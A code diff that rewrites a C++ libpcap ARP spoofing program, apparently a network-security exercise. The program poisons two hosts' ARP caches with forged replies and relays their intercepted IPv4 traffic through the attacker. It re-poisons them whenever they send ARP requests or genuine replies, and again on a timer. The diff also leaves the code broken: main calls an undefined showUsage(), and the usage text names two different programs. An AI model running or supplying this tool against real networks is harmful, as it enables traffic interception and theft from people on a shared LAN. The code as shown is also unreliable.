@@ -16,213 +16,196 @@
 #include "arphdr.h"
 
 #pragma pack(push, 1)
-struct EthArpPacket final {
-    EthHdr eth_;
-    ArpHdr arp_;
+struct ArpPacket {
+    EthHdr eth;
+    ArpHdr arp;
 };
 #pragma pack(pop)
 
 void usage() {
-    printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
-    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
+    printf("syntax: arp-spoof <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
+    printf("sample: arp-tool wlan0 192.168.0.2 192.168.0.1\n");
 }
 
-int getMyMac(const char* ifname, uint8_t* mac_addr) {
-    struct ifreq ifr{};
-    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
-    if (sockfd < 0) return -1;
+int fetchLocalMac(const char* iface, uint8_t* mac) {
+    struct ifreq ifr {};
+    int sock = socket(AF_INET, SOCK_DGRAM, 0);
+    if (sock < 0) return -1;
 
-    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
+    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
     ifr.ifr_name[IFNAMSIZ - 1] = '\0';
 
-    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0) {
-        close(sockfd);
+    if (ioctl(sock, SIOCGIFHWADDR, &ifr) != 0) {
+        close(sock);
         return -1;
     }
-    memcpy(mac_addr, ifr.ifr_hwaddr.sa_data, 6);
-    close(sockfd);
+
+    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
+    close(sock);
     return 0;
 }
 
+void transmitArp(pcap_t* pcap, const uint8_t* srcMac, const uint8_t* dstMac,
+                 const char* srcIp, const char* dstIp, bool reply) {
+    ArpPacket pkt;
 
-void send_arp_packet(pcap_t* pcap,
-    const uint8_t* src_mac,
-    const uint8_t* dst_mac,
-    const char* src_ip,
-    const char* dst_ip,
-    bool is_reply) {
-        EthArpPacket packet;
-        
-        packet.eth_.dmac_ = Mac(dst_mac);
-        packet.eth_.smac_ = Mac(src_mac);
-        packet.eth_.type_ = htons(EthHdr::Arp);
-        
-        packet.arp_.hrd_  = htons(ArpHdr::ETHER);
-        packet.arp_.pro_  = htons(EthHdr::Ip4);
-        packet.arp_.hln_  = Mac::Size;
-        packet.arp_.pln_  = Ip::Size;
-        packet.arp_.op_   = htons(is_reply ? ArpHdr::Reply : ArpHdr::Request);
-        packet.arp_.smac_ = Mac(src_mac);
-        packet.arp_.sip_  = htonl(Ip(src_ip));
-        packet.arp_.tmac_ = Mac(dst_mac);
-        packet.arp_.tip_  = htonl(Ip(dst_ip));
-        
-        if (int res = pcap_sendpacket(pcap, (const u_char*)&packet, sizeof(packet)); res != 0) {
-            std::cerr << "[ERROR] pcap_sendpacket failed: " << pcap_geterr(pcap) << std::endl;
-        }
+    pkt.eth.dmac_ = Mac(dstMac);
+    pkt.eth.smac_ = Mac(srcMac);
+    pkt.eth.type_ = htons(EthHdr::Arp);
+
+    pkt.arp.hrd_ = htons(ArpHdr::ETHER);
+    pkt.arp.pro_ = htons(EthHdr::Ip4);
+    pkt.arp.hln_ = Mac::Size;
+    pkt.arp.pln_ = Ip::Size;
+    pkt.arp.op_ = htons(reply ? ArpHdr::Reply : ArpHdr::Request);
+    pkt.arp.smac_ = Mac(srcMac);
+    pkt.arp.sip_ = htonl(Ip(srcIp));
+    pkt.arp.tmac_ = Mac(dstMac);
+    pkt.arp.tip_ = htonl(Ip(dstIp));
+
+    if (pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&pkt), sizeof(pkt)) != 0) {
+        std::cerr << "[!] Failed to send ARP: " << pcap_geterr(pcap) << "\n";
     }
-    
-    Mac getMacByIp(pcap_t* pcap, const uint8_t* attacker_mac, const char* target_ip) {
-        uint8_t broadcast[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
-        char zero_ip[] = "0.0.0.0";
-    
-        send_arp_packet(pcap, attacker_mac, broadcast, zero_ip, target_ip, false);
-    
-        struct pcap_pkthdr* header;
-        const u_char* pkt;
-        EthArpPacket reply;
-    
-        while (true) {
-            if (pcap_next_ex(pcap, &header, &pkt) <= 0) continue;
-            memcpy(&reply, pkt, sizeof(reply));
-    
-            if (ntohs(reply.eth_.type_) != EthHdr::Arp) continue;
-            if (ntohs(reply.arp_.op_) != ArpHdr::Reply) continue;
-            if (reply.arp_.sip() != Ip(target_ip)) continue;
-    
-            return reply.arp_.smac();
-        }
+}
+
+Mac resolveMac(pcap_t* pcap, const uint8_t* localMac, const char* ip) {
+    uint8_t bcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
+    char dummyIp[] = "0.0.0.0";
+
+    transmitArp(pcap, localMac, bcast, dummyIp, ip, false);
+
+    struct pcap_pkthdr* hdr;
+    const u_char* data;
+    ArpPacket res;
+
+    while (true) {
+        if (pcap_next_ex(pcap, &hdr, &data) <= 0) continue;
+
+        memcpy(&res, data, sizeof(res));
+        if (ntohs(res.eth.type_) != EthHdr::Arp) continue;
+        if (ntohs(res.arp.op_) != ArpHdr::Reply) continue;
+        if (res.arp.sip() != Ip(ip)) continue;
+
+        return res.arp.smac();
     }
-    
-struct Flow {
-    uint8_t attacker_mac[6];
-    uint8_t sender_mac[6];
-    uint8_t target_mac[6];
-    const char* sender_ip;
-    const char* target_ip;
-    pcap_t* pcap;
+}
+
+struct ArpSpoofSession {
+    uint8_t localMac[6];
+    uint8_t peer1Mac[6];
+    uint8_t peer2Mac[6];
+    const char* peer1Ip;
+    const char* peer2Ip;
+    pcap_t* handle;
 };
 
-void infectLoop(Flow s) {
-    auto last_infect = std::chrono::steady_clock::now();
+void spoofAndRelay(ArpSpoofSession session) {
+    using namespace std::chrono;
 
-    send_arp_packet(s.pcap, s.attacker_mac, s.sender_mac, s.target_ip, s.sender_ip, true);
-    send_arp_packet(s.pcap, s.attacker_mac, s.target_mac, s.sender_ip, s.target_ip, true);
-    std::cout << "[INFO] Flow " << s.sender_ip << " <-> " << s.target_ip
-              << " initial poisoning complete." << std::endl;
+    auto last = steady_clock::now();
+    transmitArp(session.handle, session.localMac, session.peer1Mac, session.peer2Ip, session.peer1Ip, true);
+    transmitArp(session.handle, session.localMac, session.peer2Mac, session.peer1Ip, session.peer2Ip, true);
+
+    std::cout << "[*] Started session: " << session.peer1Ip << " <-> " << session.peer2Ip << "\n";
 
     while (true) {
         struct pcap_pkthdr* header;
-        const u_char* pkt;
-        if (pcap_next_ex(s.pcap, &header, &pkt) <= 0) continue;
+        const u_char* packet;
 
-        EthHdr* eth = (EthHdr*)pkt;
+        if (pcap_next_ex(session.handle, &header, &packet) <= 0) continue;
+
+        EthHdr* eth = (EthHdr*)packet;
         uint16_t type = ntohs(eth->type_);
 
         if (type == EthHdr::Arp) {
-            EthArpPacket* arp = (EthArpPacket*)pkt;
-            uint16_t op = ntohs(arp->arp_.op_);
+            ArpPacket* arp = (ArpPacket*)packet;
+            auto op = ntohs(arp->arp.op_);
 
             if (op == ArpHdr::Request) {
-                bool recover = (arp->arp_.sip() == Ip(s.sender_ip) && arp->arp_.tip() == Ip(s.target_ip)) ||
-                               (arp->arp_.sip() == Ip(s.target_ip) && arp->arp_.tip() == Ip(s.sender_ip));
-                if (recover) {
-                    std::cout << "[RECOVERY] ARP request between "
-                              << s.sender_ip << " and " << s.target_ip
-                              << "; reinfecting." << std::endl;
-                    send_arp_packet(s.pcap, s.attacker_mac, s.sender_mac,
-                                    s.target_ip, s.sender_ip, true);
-                    send_arp_packet(s.pcap, s.attacker_mac, s.target_mac,
-                                    s.sender_ip, s.target_ip, true);
-                    last_infect = std::chrono::steady_clock::now();
+                bool isRelated = (arp->arp.sip() == Ip(session.peer1Ip) && arp->arp.tip() == Ip(session.peer2Ip)) ||
+                                 (arp->arp.sip() == Ip(session.peer2Ip) && arp->arp.tip() == Ip(session.peer1Ip));
+                if (isRelated) {
+                    std::cout << "[!] Recovery attempt detected (ARP request)\n";
+                    transmitArp(session.handle, session.localMac, session.peer1Mac, session.peer2Ip, session.peer1Ip, true);
+                    transmitArp(session.handle, session.localMac, session.peer2Mac, session.peer1Ip, session.peer2Ip, true);
+                    last = steady_clock::now();
+                }
+            } else if (op == ArpHdr::Reply) {
+                bool from1 = (arp->arp.sip() == Ip(session.peer1Ip) && arp->arp.smac() == Mac(session.peer1Mac));
+                bool from2 = (arp->arp.sip() == Ip(session.peer2Ip) && arp->arp.smac() == Mac(session.peer2Mac));
+                if (from1 || from2) {
+                    std::cout << "[!] Recovery attempt detected (ARP reply)\n";
+                    transmitArp(session.handle, session.localMac, session.peer1Mac, session.peer2Ip, session.peer1Ip, true);
+                    transmitArp(session.handle, session.localMac, session.peer2Mac, session.peer1Ip, session.peer2Ip, true);
+                    last = steady_clock::now();
                 }
             }
-            else if (op == ArpHdr::Reply) {
-                bool rep_s = (arp->arp_.sip() == Ip(s.sender_ip) && arp->arp_.smac() == Mac(s.sender_mac));
-                bool rep_t = (arp->arp_.sip() == Ip(s.target_ip) && arp->arp_.smac() == Mac(s.target_mac));
-                if (rep_s || rep_t) {
-                    std::cout << "[RECOVERY] ARP reply from "
-                              << (rep_s ? s.sender_ip : s.target_ip)
-                              << "; reinfecting." << std::endl;
-                    send_arp_packet(s.pcap, s.attacker_mac, s.sender_mac,
-                                    s.target_ip, s.sender_ip, true);
-                    send_arp_packet(s.pcap, s.attacker_mac, s.target_mac,
-                                    s.sender_ip, s.target_ip, true);
-                    last_infect = std::chrono::steady_clock::now();
-                }
-            }
-        }
-        else if (type == EthHdr::Ip4) {
-            if (eth->smac() == s.sender_mac && eth->dmac() == s.attacker_mac) {
-                std::vector<u_char> relay(pkt, pkt + header->caplen);
-                auto neweth = (EthHdr*)relay.data();
-                neweth->smac_ = Mac(s.attacker_mac);
-                neweth->dmac_ = Mac(s.target_mac);
-                pcap_sendpacket(s.pcap, relay.data(), header->caplen);
-            }
-            else if (eth->smac() == s.target_mac && eth->dmac() == s.attacker_mac) {
-                std::vector<u_char> relay(pkt, pkt + header->caplen);
-                auto neweth = (EthHdr*)relay.data();
-                neweth->smac_ = Mac(s.attacker_mac);
-                neweth->dmac_ = Mac(s.sender_mac);
-                pcap_sendpacket(s.pcap, relay.data(), header->caplen);
+        } else if (type == EthHdr::Ip4) {
+            if (eth->smac() == session.peer1Mac && eth->dmac() == session.localMac) {
+                std::vector<u_char> relay(packet, packet + header->caplen);
+                auto eth2 = (EthHdr*)relay.data();
+                eth2->smac_ = Mac(session.localMac);
+                eth2->dmac_ = Mac(session.peer2Mac);
+                pcap_sendpacket(session.handle, relay.data(), header->caplen);
+            } else if (eth->smac() == session.peer2Mac && eth->dmac() == session.localMac) {
+                std::vector<u_char> relay(packet, packet + header->caplen);
+                auto eth2 = (EthHdr*)relay.data();
+                eth2->smac_ = Mac(session.localMac);
+                eth2->dmac_ = Mac(session.peer1Mac);
+                pcap_sendpacket(session.handle, relay.data(), header->caplen);
             }
         }
 
-        auto now = std::chrono::steady_clock::now();
-        if (std::chrono::duration_cast<std::chrono::seconds>(now - last_infect).count() >= 100) {
-            std::cout << "[PERIODIC] Reinfection timer expired; re-sending ARP poisons." << std::endl;
-            send_arp_packet(s.pcap, s.attacker_mac, s.sender_mac,
-                            s.target_ip, s.sender_ip, true);
-            send_arp_packet(s.pcap, s.attacker_mac, s.target_mac,
-                            s.sender_ip, s.target_ip, true);
-            last_infect = now;
+        if (duration_cast<seconds>(steady_clock::now() - last).count() >= 90) {
+            std::cout << "[*] Timer triggered ARP reinfection.\n";
+            transmitArp(session.handle, session.localMac, session.peer1Mac, session.peer2Ip, session.peer1Ip, true);
+            transmitArp(session.handle, session.localMac, session.peer2Mac, session.peer1Ip, session.peer2Ip, true);
+            last = steady_clock::now();
         }
     }
 }
 
 int main(int argc, char* argv[]) {
-    if (argc < 4 || (argc % 2) != 0) {
-        usage();
-        return EXIT_FAILURE;
+    if (argc < 4 || argc % 2 != 0) {
+        showUsage();
+        return 1;
     }
 
-    const char* dev = argv[1];
+    const char* iface = argv[1];
     char errbuf[PCAP_ERRBUF_SIZE];
+    uint8_t myMac[6];
 
-    uint8_t attacker_mac[6];
-    if (getMyMac(dev, attacker_mac) != 0) {
-        std::cerr << "[ERROR] Cannot obtain local MAC on " << dev << std::endl;
-        return EXIT_FAILURE;
+    if (fetchLocalMac(iface, myMac) != 0) {
+        std::cerr << "[X] Failed to get MAC address for " << iface << "\n";
+        return 1;
     }
 
-    std::vector<std::thread> threads;
+    std::vector<std::thread> workers;
     for (int i = 2; i < argc; i += 2) {
-        const char* sender_ip = argv[i];
-        const char* target_ip = argv[i + 1];
+        const char* ip1 = argv[i];
+        const char* ip2 = argv[i + 1];
 
-        pcap_t* handle = pcap_open_live(dev, 65536, 1, 1, errbuf);
-        if (!handle) {
-            std::cerr << "[ERROR] pcap_open_live failed: " << errbuf << std::endl;
+        pcap_t* pcap = pcap_open_live(iface, 65536, 1, 1, errbuf);
+        if (!pcap) {
+            std::cerr << "[X] pcap_open_live error: " << errbuf << "\n";
             continue;
         }
 
-        Flow s{};
-        memcpy(s.attacker_mac, attacker_mac, 6);
-        s.pcap = handle;
-        Mac sm = getMacByIp(handle, attacker_mac, sender_ip);
-        Mac tm = getMacByIp(handle, attacker_mac, target_ip);
-        memcpy(s.sender_mac, static_cast<const uint8_t*>(sm), 6);
-        memcpy(s.target_mac, static_cast<const uint8_t*>(tm), 6);
-        s.sender_ip = sender_ip;
-        s.target_ip = target_ip;
+        ArpSpoofSession session {};
+        memcpy(session.localMac, myMac, 6);
+        session.peer1Ip = ip1;
+        session.peer2Ip = ip2;
+        session.handle = pcap;
 
-        std::cout << "[INFO] Starting Flow " << (i/2) << ": "
-                  << sender_ip << " <-> " << target_ip << std::endl;
-        threads.emplace_back(infectLoop, s);
+        Mac mac1 = resolveMac(pcap, myMac, ip1);
+        Mac mac2 = resolveMac(pcap, myMac, ip2);
+        memcpy(session.peer1Mac, static_cast<const uint8_t*>(mac1), 6);
+        memcpy(session.peer2Mac, static_cast<const uint8_t*>(mac2), 6);
+
+        std::cout << "[*] Session setup: " << ip1 << " <-> " << ip2 << "\n";
+        workers.emplace_back(spoofAndRelay, session);
     }
 
-    for (auto& t : threads) t.join();
+    for (auto& t : workers) t.join();
     return 0;
 }
-
